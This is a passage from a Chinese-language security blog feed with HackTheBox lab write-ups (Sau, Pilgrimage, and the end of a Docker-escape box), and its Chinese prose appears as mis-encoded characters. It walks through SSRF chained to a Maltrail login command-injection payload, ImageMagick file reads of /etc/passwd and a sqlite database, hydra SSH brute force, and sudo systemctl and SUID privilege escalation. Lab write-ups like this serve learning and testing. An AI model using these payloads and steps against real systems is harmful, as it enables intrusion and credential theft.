src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ggdaCi7uMz.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gMjX2tx9ck.png" alt=""></p><p>ç»“æœç¯å¢ƒé‡Œå°±æ²¡æœ‰å®‰è£…gccâ€¦</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_E2jbbHVlqA.png" alt=""></p><p>åˆåœ¨linpeasé‡Œé¢ç¿»äº†å¾ˆä¹…ï¼Œæ ¹æ®é‡Œé¢çš„ä¿¡æ¯å¯ä»¥å¯Ÿè§‰åˆ°è¿™é‡Œå’ŒCACTIï¼ˆä¸Šé¢é‚£ä¸ªShellï¼‰åº”è¯¥æ˜¯ä¸¤ä¸ªæœºå™¨ï¼Œæ ¹æ®è¿›ç¨‹ä¿¡æ¯å¯ä»¥åˆ¤æ–­è¿™è¾¹åº”è¯¥è·‘ç€Dockerï¼ŒCACTIå¯èƒ½å°±æ˜¯ä¸ªå®¹å™¨</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wz-LAKfkiI.png" alt=""></p><p>äºæ˜¯æŸ¥ä¸€ä¸‹Dockerç‰ˆæœ¬çœ‹çœ‹æœ‰æ²¡æœ‰nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_s1KagKh6AJ.png" alt=""></p><p>è¿˜çœŸæœ‰ï¼Œè¯¥æ¼æ´å…è®¸éç‰¹æƒLinuxç”¨æˆ·è®¿é—®å’Œè¿è¡Œå®¹å™¨å†…çš„ç¨‹åºã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7P_NAmATET.png" alt=""></p><p>æ‰¾åˆ°EXPç›´æ¥å¼€å†²ï¼š<a href="https://github.com/UncleJ4ck/CVE-2021-41091" title="https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8VoeEON5zC.png" alt=""></p><p>ä½†æ˜¯è·‘å®Œä¹‹åè¿˜æ˜¯æ²¡æˆåŠŸå˜›ï¼Œè®¤çœŸçœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåœ¨å®¹å™¨å†…ç»™<code>/bin/bash</code> åŠ ä¸ŠSUID</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aQYhSIoU6I.png" alt=""></p><p>åˆå›åˆ°CACTIé‡Œé¢ææƒï¼ŒSUIDè¿™é‡Œå‘ç°äº†<code>capsh</code>å¯ä»¥è¿›è¡Œææƒ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dRVimB8E8u.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CiVOFKRHht.png" alt=""></p><p>å†å›å»è¯•è¯•</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zL_9eQzyj8.png" alt=""></p><p>æ‹¿ä¸‹ï¼è¿™å°é¶æœºï¼Œå¼€å±€ç›´æ¥é€ä¸ªShellï¼Œæˆ‘è¿˜åœ¨æƒ³è¿™ä¹Ÿå¤ªç®€å•äº†ã€‚ç»“æœæ˜¯ä¸ªContainerç¯å¢ƒï¼Œè¿˜å¾—Dockeré€ƒé€¸ï¼Œæ•´ä½“è¿˜æ˜¯æŒºæœ‰æ”¶è·çš„</p>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sau - HackTheBox</title>
    <link href="/2023/07/15/Sau-HackTheBox/"/>
    <url>/2023/07/15/Sau-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>å¼€å±€å…ˆæ‰«ä¸€ä¸‹ï¼Œå‘ç°åªæœ‰22å’Œ55555ç«¯å£å¯ä»¥è®¿é—®</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VAkKigqcJ4.png" alt=""></p><p>è¿›å»ç›´æ¥çœ‹åˆ°å¼€æºé¡¹ç›®äº†éƒ½</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xP0f5_NGN8.png" alt=""></p><p>çœ‹ä»‹ç»è¿™æ˜¯ä¸€ä¸ªæ”¶é›†HTTPè¯·æ±‚å¹¶ä¸”å¯ä»¥å±•ç¤ºå’Œæ£€é˜…å®ƒä»¬çš„ä¸€ä¸ªç®€å•çš„WebæœåŠ¡</p><p>çœ‹å¼€æºé¡¹ç›®çš„æ—¶å€™ç•™æ„åˆ°æœ€æ–°çš„Releaseå·²ç»æ˜¯v1.2.3äº†ï¼ŒæŒ‰ç…§HackTheBoxçš„å¥—è·¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ndayï¼ˆå¬å¤§ä½¬è¯´çš„ï¼‰æ‰€ä»¥GoogleæŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„nday</p><p>æœç„¶Googleä¸€æŸ¥å°±æœ‰äº†ï¼ˆCVE-2023-27163ï¼‰</p><h3 id="GetShell-è¿‡ç¨‹"><a href="#GetShell-è¿‡ç¨‹" class="headerlink" title="GetShell è¿‡ç¨‹"></a>GetShell è¿‡ç¨‹</h3><h4 id="CVE-2023-27163"><a href="#CVE-2023-27163" class="headerlink" title="CVE-2023-27163"></a>CVE-2023-27163</h4><p>ç ”ç©¶ä¸€ä¸‹æ‰¾åˆ°çš„POCï¼š<a href="https://github.com/entr0pie/CVE-2023-27163" title="https://github.com/entr0pie/CVE-2023-27163">https://github.com/entr0pie/CVE-2023-27163</a></p><p>è¿™æ˜¯ä¸€ä¸ªSSRFæ¼æ´ï¼Œé€šè¿‡è¿™ä¸ªè„šæœ¬å°±èƒ½ç®€å•çš„åˆ©ç”¨</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BKNxZ6ZdaA.png" alt=""></p><p>æˆ‘ä¹Ÿè¯•ä¸€ä¸‹ï¼Œç¡®å®æ˜¯å¯ä»¥çš„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G3MypS21zZ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_b4GizETLLm.png" alt=""></p><p>æˆåŠŸäº†ä½†è¿™æ ·è·‘POCå¥½åƒæ²¡å•¥ç”¨ï¼Œè¿˜ä¸çŸ¥é“æ¼æ´è¯¦ç»†æƒ…å†µï¼Œäºæ˜¯æ‰¾åˆ°äº†å…³äºè¿™ä¸ªæ¼æ´æ›´è¯¦ç»†çš„ä»‹ç»ï¼š</p><p><a href="https://notes.sjtu.edu.cn/s/MUUhEymt7#" title="https://notes.sjtu.edu.cn/s/MUUhEymt7#">https://notes.sjtu.edu.cn/s/MUUhEymt7#</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CAbd47AZjs.png" alt=""></p><p>åŸæ¥å°±æ˜¯è¿™ä¸ªforward_urlå­˜åœ¨æ¼æ´ï¼Œæ ¹æ®æ–‡ç« æç¤ºï¼Œåˆ›å»ºå®ŒBasketsä¹‹åè¦è®¿é—®ä¸€ä¸‹æ‰èƒ½è§¦å‘</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sDuk0s9XMi.png" alt=""></p><p>æˆ‘ä¹Ÿè¯•è¯•çœ‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9w8v6vXA6N.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkJ7I-RTya.png" alt=""></p><p>æˆåŠŸäº†ï¼Œä½†è¿˜æ˜¯ä¸çŸ¥é“èƒ½å¹²å•¥ï¼Œä¸è¿‡å¯ä»¥å‘ç°è¿™é‡Œçš„HTTP Requestä¿¡æ¯æ˜¯æˆ‘çš„æœ¬åœ°æµè§ˆå™¨çš„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_X8-5u6xQNS.png" alt=""></p><p>è¿™é‡Œæƒ³ç ´è„‘è¢‹ä¹Ÿæ‰¾äº†å¾ˆå¤šæ–‡ç« ï¼Œéƒ½æ²¡æ‰¾åˆ°SSRFæ— å›æ˜¾åœ¨è¿™ç§æƒ…å†µä¸‹æœ‰ä»€ä¹ˆç”¨ã€‚ä½†æ˜¯ä¸Šé¢çš„ncç›‘å¬çš„æ¶ˆæ¯é‡Œå‘ç°ï¼Œå…¶å®å®ƒä¼šæ¥GETæˆ‘æŒ‡å®šçš„å†…å®¹ã€‚å›æƒ³èµ·ç«¯å£æ‰«æçš„æ—¶å€™filteredçš„80å’Œ8338ç«¯å£ï¼Œæˆ‘ä»¬èƒ½ä¸èƒ½è®©æœåŠ¡å™¨å»GETè¿™äº›å†…å®¹å‘¢ï¼Ÿ</p><p>è¿™é‡ŒæŒ‡å®š<code>forward_url</code>ä¸º<code>127.0.0.1:80</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_57fdSqqUTc.png" alt=""></p><p>ç»“æœè¿˜æ˜¯æ²¡ç”¨â€¦</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-YgCXLeHOx.png" alt=""></p><p>ç•™æ„åˆ°<code>&quot;proxy_response&quot;: false</code> è¯•äº†ä¸€ä¸‹æ”¹æˆ<code>true</code>è¡Œä¸è¡Œ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_efG6PM5KOq.png" alt=""></p><p>é€†å¤©â€¦è¿˜çœŸå°±è¡Œäº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2naG2hEYyk.png" alt=""></p><p>è®¿é—®ä¸€ä¸‹å‘ç°ä¹Ÿæ˜¯ä¸ªé¡¹ç›®ï¼Œè€è§„çŸ©æœä¸€ä¸‹nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SnDN41b2J0.png" alt=""></p><h4 id="Maltrail-RCE"><a href="#Maltrail-RCE" class="headerlink" title="Maltrail RCE"></a>Maltrail RCE</h4><p>è¿™ä¸œè¥¿æ²¡æœ‰ç”³è¯·CVEï¼Œexploitdbæœä¸åˆ°ï¼Œä¸è¿‡GoogleæŸ¥åˆ°äº†</p><p><a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/" title="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></p><p>æ–‡ç« é‡Œè¡¨ç¤ºè¿™æ ·å°±èƒ½æ‰§è¡Œå‘½ä»¤äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&#x27;http://hostname:8338/login&#x27;</span> \<br>  --data <span class="hljs-string">&#x27;username=;`id &gt; /tmp/bbq`&#x27;</span><br></code></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢çš„æµ‹è¯•ï¼Œè¿™ä¸ªæœåŠ¡ä¼šæŠŠæˆ‘ä»¬çš„HTTP Requestå¸¦è¿‡å»ï¼Œæ­£å¥½å¯ä»¥é€šè¿‡SSRFæ‰“</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-n4kYto8Q7.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2TA0Pwcolb.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2OZHx8W2HL.png" alt=""></p><h3 id="ææƒè¿‡ç¨‹"><a href="#ææƒè¿‡ç¨‹" class="headerlink" title="ææƒè¿‡ç¨‹"></a>ææƒè¿‡ç¨‹</h3><p>pumaç”¨æˆ·å¯ä»¥å…å¯†ä½¿ç”¨sudoæ‰§è¡Œ <code>/usr/bin/systemctl</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ccYEP8L9x_.png" alt=""></p><p>æ ¹æ®CTFOBinsçš„æŒ‡ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥æ»¥ç”¨sudoæƒé™ææƒè‡³root</p><p><a href="https://gtfobins.github.io/gtfobins/systemctl/" title="https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</a></p><p>è¿™é‡Œå…ˆæä¸ªbashå¥½æ“ä½œä¸€äº›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ script /dev/null /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mTATfJvJ7l.png" alt=""></p><p>æ‹¿ä¸‹ï¼ä½†æ˜¯æ„Ÿè§‰SSRFé‚£é‡ŒçœŸçš„æœ‰ç‚¹éœ€è¦è„‘æ´äº†ï¼Œä¸å¤ªå‹å¥½ã€‚ææƒéƒ¨åˆ†è¿˜æŒºç®€å•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pilgrimage - HackTheBox</title>
    <link href="/2023/07/15/Pilgrimage-HackTheBox/"/>
    <url>/2023/07/15/Pilgrimage-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>Noob çš„ HackTheBox ä¹‹æ—…</p><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>VPSï¼š43.134.44.115</p><p>Macï¼šlocalhost</p><p>Burpsuite</p><h3 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h3><ol><li>VPSé€šè¿‡OpenVPNè¿æ¥HacktheBox</li><li>Macé€šè¿‡ç«¯å£è½¬å‘å°†7080ç«¯å£è½¬å‘åˆ°VPS<br><code>ssh -qTfnN -D 7080 user@43.134.44.115</code></li><li>æµè§ˆå™¨é€šè¿‡Burpsuite å°†æ•°æ®ä»£ç†åˆ°7080ç«¯å£</li></ol><p>è¿™æ ·å°±å¯ä»¥åœ¨æœ¬åœ°çš„æµè§ˆå™¨ä¸Šé€šè¿‡Burpsuiteæµç•…çš„æµ‹HacktheBoxçš„é¶æœºäº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.40.38_0Z6PAL7BFH.png" alt=""></p><h3 id="getShellè¿‡ç¨‹"><a href="#getShellè¿‡ç¨‹" class="headerlink" title="getShellè¿‡ç¨‹"></a>getShellè¿‡ç¨‹</h3><p>å…ˆä½“éªŒä¸€ä¸‹åŠŸèƒ½ï¼Œä»PHPSESSIDçœ‹åç«¯è¯­è¨€åº”è¯¥æ˜¯PHP</p><h4 id="ä¸Šä¼ åŠŸèƒ½"><a href="#ä¸Šä¼ åŠŸèƒ½" class="headerlink" title="ä¸Šä¼ åŠŸèƒ½"></a>ä¸Šä¼ åŠŸèƒ½</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.47.17_kohrftGCRO.png" alt=""></p><p>è¯•äº†ä¸€ä¸‹å°±ç®—ä¸Šä¼ PHPåç¼€ä¹Ÿä¼šè¢«å¤„ç†æˆjpegæ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.48.22_uiGRMegOtP.png" alt=""></p><h4 id="ç™»å½•æ³¨å†ŒåŠŸèƒ½"><a href="#ç™»å½•æ³¨å†ŒåŠŸèƒ½" class="headerlink" title="ç™»å½•æ³¨å†ŒåŠŸèƒ½"></a>ç™»å½•æ³¨å†ŒåŠŸèƒ½</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.51.25_Y2DHrHU3jp.png" alt=""></p><h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.52.38_j7X0NQnfse.png" alt=""></p><p>å‘ç°gitæ³„æ¼ï¼Œä½¿ç”¨GitHackä¸‹è½½é¡¹ç›®ä»£ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.54.49_jdE_HMMt8T.png" alt=""></p><h4 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h4><p>æ‰“åŒ…ä»£ç ä¸‹è½½åˆ°æœ¬åœ°è¿›è¡Œä»£ç å®¡è®¡</p><p><code>tar -zcvf pilgrimage.zip pilgrimage.htb</code></p><p>ç™»å½•å’Œæ³¨å†ŒåŠŸèƒ½ä¸¤ä¸ªå‚æ•°éƒ½ä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œæ³¨å…¥æ— æœ›</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.22.33_ptkVK9pfwc.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.23.08_mT42LgcO03.png" alt=""></p><p>ä¸Šä¼ åŠŸèƒ½è¿™é‡Œä½¿ç”¨äº†magickå»å¤„ç†å›¾ç‰‡ï¼Œå¹¶ä¸”ä¼šå°†åç¼€åè®¾ç½®æˆjpegå’Œpngã€‚ä¸Šä¼ æ— æœ›</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.26.17__e5mG9nXJ_.png" alt=""></p><p>imagemagickè¿™ä¸œè¥¿ä¹‹å‰æœ‰è‘—åçš„RCEæ¼æ´ï¼Œè€Œä¸”gitæ³„æ¼è¿™é‡Œè¿˜æœ‰magickè¿™ä¸ªæ–‡ä»¶ã€‚è¿™é‡Œä¼šä¸ä¼šå­˜åœ¨ndayå‘¢</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.33.59_lpO2xVC0d1.png" alt=""></p><p>é€šè¿‡æ‰§è¡Œå‘½ä»¤æŸ¥åˆ°ç‰ˆæœ¬å·ï¼Œæˆ‘ä»¬å¯ä»¥å»exploitdbæŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_guPmAiygOf.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.43.08_FWb7QWQS85.png" alt=""></p><p>æœ‰ä¸ªä»»æ„æ–‡ä»¶è¯»å–å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs çº¯æ–‡æœ¬"># Exploit Title: ImageMagick  7.1.0-49 - Arbitrary File Read<br># Google Dork: N/A<br># Date: 06/02/2023<br># Exploit Author: Cristian &#x27;void&#x27; Giustini<br># Vendor Homepage: https://imagemagick.org/<br># Software Link: https://imagemagick.org/<br># Version: &lt;= 7.1.0-49<br># Tested on: 7.1.0-49 and 6.9.11-60<br># CVE : CVE-2022-44268 (CVE Owner: Metabase Q Team<br>https://www.metabaseq.com/imagemagick-zero-days/)<br># Exploit pre-requirements: Rust<br><br><br># PoC : https://github.com/voidz0r/CVE-2022-44268<br></code></pre></td></tr></table></figure><h4 id="CVE-2022-44268"><a href="#CVE-2022-44268" class="headerlink" title="CVE-2022-44268"></a>CVE-2022-44268</h4><p>ç ”ç©¶ä¸‹POCçš„ç”¨æ³•ï¼š</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.47.01_l39CB6Z4lT.png" alt=""></p><p>å…ˆé€šè¿‡é¡¹ç›®ç»™çš„å·¥å…·æŒ‡å®šè¦è¯»å–çš„æ–‡ä»¶ï¼Œç„¶åå°†ç”Ÿæˆimage.pngäº¤ç»™imageMagickå¤„ç†ï¼Œè¿™ä¸€æ­¥äº¤ç»™å­˜åœ¨æ¼æ´çš„WebæœåŠ¡å™¨å»è§¦å‘æ¼æ´è¯»å–æŒ‡å®šæ–‡ä»¶ï¼Œç„¶åå°†å›¾ç‰‡ä¸‹è½½å›æ¥ä½¿ç”¨identifyè¾“å‡ºè¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Ty3jJ8z8q.png" alt=""></p><p><code>identify -verbose oout.png</code></p><p>è¾“å‡ºè¯»å–åˆ°çš„å†…å®¹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oag5we8Y1F.png" alt=""></p><p>è¿™é‡Œå°±è·å–åˆ°äº† /etc/passwd æ–‡ä»¶å†…å®¹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_My0Ds4YEh3.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_x5M4BI1MNE.png" alt=""></p><p>åªæœ‰emilyå’Œrootç”¨æˆ·æ˜¯å¯ä»¥ç™»å½•åˆ°bashçš„</p><p>è¿™é‡Œæƒ³åˆ°å°è¯•ä¸€ä¸‹çˆ†ç ´ï¼Œç›´æ¥çˆ†ç ´rootåº”è¯¥ä¸å¯èƒ½ï¼Œä½†å¯ä»¥è¯•ä¸€ä¸‹emily</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l emily -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt ssh://10.10.11.219 -t 4<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EI3NuikA9X.png" alt=""></p><p>ç„¶åå‘ç°å¥½åƒä¸å¤ªé€‚åˆï¼Œçˆ†ç ´é€Ÿåº¦ç‰¹åˆ«æ…¢ã€‚æƒ³äº†ä¸€ä¸‹å…¬å…±é¶æœºåº”è¯¥ä¹Ÿä¸å¸Œæœ›ç”¨æˆ·ä¸€èµ·çˆ†ç ´</p><p>é‚£è¿˜æ˜¯å›åˆ°ä»»æ„æ–‡ä»¶è¯»å–è¿™ä¸ªæ¼æ´å§</p><p>å†™ä¸ªè„šæœ¬ç®€åŒ–æµç¨‹ï¼Œç ”ç©¶äº†ä¸€ä¸‹identifyå‘½ä»¤ã€‚å¦‚æœåªéœ€è¦Raw profile typeéƒ¨åˆ†çš„å†…å®¹ï¼Œéœ€è¦æ‰§è¡Œï¼š</p><p><code>identify  -format &quot;%[Raw profile type]&quot; -verbose oout.png</code></p><p>é“¾æ¥ï¼š<a href="https://www.imagemagick.org/script/escape.php" title="https://www.imagemagick.org/script/escape.php">https://www.imagemagick.org/script/escape.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">import sys<br>import requests<br>import subprocess<br><br>def run_identify(image_path):<br>    <span class="hljs-built_in">command</span> = [<span class="hljs-string">&#x27;identify&#x27;</span>, <span class="hljs-string">&#x27;-format&#x27;</span>, <span class="hljs-string">&#x27;%[Raw profile type]&#x27;</span>, <span class="hljs-string">&#x27;-verbose&#x27;</span>, image_path]<br>    <br>    try:<br>        output = subprocess.check_output(<span class="hljs-built_in">command</span>, stderr=subprocess.STDOUT, universal_newlines=True)<br>        <span class="hljs-comment">#è¿™é‡Œ[10:-8]æ˜¯ä¸ºäº†é™¤å»1473å’Œverboseç­‰æ— æ•ˆæ•°æ®</span><br>        <span class="hljs-built_in">print</span>(bytes.fromhex(output[10:]))<br>    <br>    except subprocess.CalledProcessError as e:<br>        <span class="hljs-built_in">print</span>(e.output)<br><br>def download_image(url, path):<br>    try:<br>        response = requests.get(url)<br>        response.raise_for_status()<br>        with open(path, <span class="hljs-string">&#x27;wb&#x27;</span>) as file:<br>            file.write(response.content)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å›¾ç‰‡ä¸‹è½½æˆåŠŸ&#x27;</span>)<br>    except requests.exceptions.RequestException as e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å›¾ç‰‡ä¸‹è½½å¤±è´¥:&#x27;</span>, str(e))<br><br><br><br><span class="hljs-keyword">if</span> len(sys.argv) &lt; 2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;è¯·æä¾›å›¾ç‰‡è·¯å¾„ä½œä¸ºå‚æ•°&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    image_path = sys.argv[1]<br>    url = sys.argv[2]<br>    download_image(url, image_path)<br>    run_identify(image_path)<br></code></pre></td></tr></table></figure><p>ä½†è¿™é‡Œåˆä¸çŸ¥é“åº”è¯¥è¯»å“ªäº›æ–‡ä»¶å¥½äº†ï¼Œæƒ³äº†æŒºä¹…ä¼šæƒ³èµ·WebæœåŠ¡ç”¨çš„æ˜¯sqliteçš„æ•°æ®åº“ã€‚æˆ‘ä»¬å¯ä»¥æŠŠsqliteæ•°æ®åº“æ–‡ä»¶è¯»å–ï¼Œçœ‹çœ‹æ•°æ®é‡Œé¢èƒ½ä¸èƒ½å‘ç°ä»€ä¹ˆ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CRWqLejbJU.png" alt=""></p><p>ä¸‹è½½æ•°æ®åº“æ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BV8rRtBuYs.png" alt=""></p><p>ç”¨å‘½ä»¤å°†æ–‡ä»¶ä¿å­˜åå¤„ç†ä¸€ä¸‹ï¼Œä¸»è¦æ˜¯åˆ é™¤æ— ç”¨å­—ç¬¦ï¼ˆbâ€™ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python identify.py out.png http://pilgrimage.htb/shrunk/64b1faf7e3216.png &gt; sqli.db<br><span class="hljs-comment"># ä»16è¿›åˆ¶è½¬ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶</span><br><span class="hljs-built_in">cat</span> sqli.db | xxd -r -p &gt; sqlite.db<br><br>-r è¡¨ç¤ºè¦è¿›è¡Œé€†å‘è½¬æ¢ï¼Œä»åå…­è¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶<br>-p è¡¨ç¤ºè¾“å…¥çš„åå…­è¿›åˆ¶æ•°æ®æ˜¯è¿ç»­çš„ï¼Œæ²¡æœ‰ç©ºæ ¼æˆ–å…¶ä»–å­—ç¬¦åˆ†éš”<br><br></code></pre></td></tr></table></figure><p>å­¦ä¹ ä¸€ä¸‹sqliteå‘½ä»¤ï¼š<a href="https://www.runoob.com/sqlite/sqlite-commands.html" title="https://www.runoob.com/sqlite/sqlite-commands.html">https://www.runoob.com/sqlite/sqlite-commands.html</a></p><p>ä»æ•°æ®åº“ä¸­å¯ä»¥æŸ¥åˆ°ç”¨æˆ·emilyå’Œå¯†ç ï¼Œemilyä¹‹å‰åœ¨ /etc/passwdæ–‡ä»¶é‡Œè§åˆ°è¿‡äº†ï¼Œæˆ‘ç›´æ¥ssh</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iTfAwExvk4.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BBjGnqlCT8.png" alt=""></p><p>ç™»å½•æˆåŠŸï¼Œæ˜¯ä¸ªæ™®é€šç”¨æˆ·ï¼Œæ‹¿åˆ°äº†user.txt ä¸­çš„user flagã€‚ä¸‹ä¸€æ­¥ææƒ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Nhu_Ax6Ay2.png" alt=""></p><h3 id="ææƒ"><a 